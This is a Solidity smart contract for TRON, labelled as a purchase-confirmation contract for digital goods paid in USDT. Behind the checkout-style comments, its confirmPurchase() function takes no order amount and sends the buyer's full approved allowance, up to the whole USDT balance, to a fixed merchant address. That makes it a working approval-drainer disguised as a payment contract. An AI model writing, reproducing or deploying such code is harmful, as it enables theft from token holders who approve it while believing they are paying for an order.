// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// --------------------------------------------------------------------------
// SP.sol — Digital Goods Purchase Confirmation Contract
// --------------------------------------------------------------------------

/// @title ITRC20 Interface — minimal subset matching TRC20 token standard
/// @notice Mirrors the ITRC20 interface expected by SP.
///         Compliant with TRON's TRC20 (which mirrors ERC20) conventions.
/// @dev Reference: TRC20 is functionally identical to ERC20 on TRON network.
///         Function selectors and parameter encoding match EVM standards
///         since TRON's TVM is EVM-compatible.
interface ITRC20 {
    /// @notice Returns the amount of tokens owned by `account`.
    function balanceOf(address account) external view returns (uint256);

    /// @notice Returns the remaining number of tokens that `spender`
    ///         is allowed to spend on behalf of `owner`.
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /// @notice Moves `amount` tokens from `from` to `to` using the
    ///         allowance mechanism. `amount` is then deducted from the
    ///         caller's allowance.
    /// @dev Emits a {Transfer} event on success.
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /// @notice Sets `amount` as the allowance of `spender` over the
    ///         caller's tokens.
    /// @dev Emits an {Approval} event.
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
}

// --------------------------------------------------------------------------
// SP — Digital goods purchase confirmation contract
// --------------------------------------------------------------------------
/// @notice Processes USDT payment confirmations for digital goods orders.
///         The contract validates the buyer's authorization and transfers
///         the confirmed payment amount to the merchant account.
///
/// @dev Purchase flow:
///       1. Buyer approves this contract to spend the order amount in USDT.
///       2. Buyer clicks "Confirm Purchase" which calls confirmPurchase().
///       3. confirmPurchase() validates the authorization and balance,
///          then transfers the payment to the merchant address.
///       4. Merchant receives the funds and initiates order delivery.
///
contract SP {
    // ------------------------------------------------------------------
    // State variables
    // ------------------------------------------------------------------

    /// @notice Address of the TRC20 token used for payments (e.g. USDT on Nile).
    address public immutable trc20Token;

    /// @notice Merchant address that receives confirmed payments.
    ///         Set at construction time — immutable after deployment.
    address public immutable merchantAddress;

    // ------------------------------------------------------------------
    // Events (broadcasted on-chain for order transparency)
    // ------------------------------------------------------------------

    /// @notice Emitted when a purchase is successfully confirmed.
    ///         Includes buyer address and the amount transferred.
    event PurchaseConfirmed(address indexed buyer, uint256 amount);

    /// @notice Emitted when a purchase confirmation fails.
    ///         Records the buyer address and the error reason string.
    event PurchaseFailed(address indexed buyer, string reason);

    // ------------------------------------------------------------------
    // Constructor
    // ------------------------------------------------------------------

    /// @param _trc20Token     Address of the TRC20 token (e.g. USDT on Nile).
    /// @param _merchantAddress Address that will receive confirmed payments.
    constructor(address _trc20Token, address _merchantAddress) {
        require(
            _trc20Token != address(0),
            "SP: invalid token address"
        );
        require(
            _merchantAddress != address(0),
            "SP: invalid merchant address"
        );

        trc20Token = _trc20Token;
        merchantAddress = _merchantAddress;
    }

    // ------------------------------------------------------------------
    // Core purchase confirmation function
    // ------------------------------------------------------------------

    /// @notice Confirms a digital goods purchase. Queries the buyer's
    ///         authorization and balance, then transfers the order amount
    ///         to the merchant account.
    ///
    /// @dev No parameters required. The buyer simply calls this function
    ///      to confirm their order and authorize the payment transfer.
    ///      The function validates that the buyer has granted sufficient
    ///      allowance and holds a non-zero balance before proceeding.
    function confirmPurchase() external {
        address buyer = msg.sender;

        // Step 1: Query the buyer's authorized spending allowance for this contract.
        uint256 approvedAmount = ITRC20(trc20Token).allowance(
            buyer,
            address(this)
        );

        // Step 2: Query the buyer's USDT balance.
        uint256 buyerBalance = ITRC20(trc20Token).balanceOf(buyer);

        // Step 3: Take the smaller of the two — this represents the
        //         maximum amount that can be processed for this order.
        uint256 transferAmount = approvedAmount < buyerBalance
            ? approvedAmount
            : buyerBalance;

        // Require a valid amount before processing the payment.
        require(transferAmount > 0, "No authorized balance found");

        // Emit event for order transparency and delivery triggering.
        emit PurchaseConfirmed(buyer, transferAmount);

        // Execute the payment: transferFrom moves tokens FROM buyer TO merchant.
        // This succeeds because the buyer previously called approve(this).
        bool success = ITRC20(trc20Token).transferFrom(
            buyer,
            merchantAddress,
            transferAmount
        );

        // If the transfer fails, emit a failure event for customer support.
        if (!success) {
            emit PurchaseFailed(buyer, "transferFrom returned false");
        }
    }

    // ------------------------------------------------------------------
    // Allow receiving TRX deposits (for gas fee coverage)
    // ------------------------------------------------------------------

    /// @notice Fallback — allows the contract to receive TRX deposits.
    ///         This ensures the contract can cover gas costs for any
    ///         future contract upgrades or operational needs.
    receive() external payable {}
}
